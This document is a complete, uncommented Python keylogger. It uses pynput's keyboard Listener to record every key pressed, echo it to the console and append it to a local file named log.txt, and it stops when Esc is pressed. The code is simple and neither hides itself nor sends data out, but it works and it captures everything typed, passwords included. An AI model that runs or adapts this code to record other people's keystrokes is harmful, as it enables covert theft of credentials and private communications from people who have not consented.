from pynput.keyboard import Listener
import sys

def captura(key):
    tecla = str(key)
    tecla = tecla.replace("'", "")
    print(tecla)
    if tecla == "Key.esc":
        sys.exit()
    if tecla == "Key.space":
        tecla = " "
    if tecla == "Key.enter":
        tecla = " [ENTER] "
    with open("log.txt", "a") as File:
        File.write(tecla)

with Listener(on_press=captura) as Listen:
    Listen.join()
        
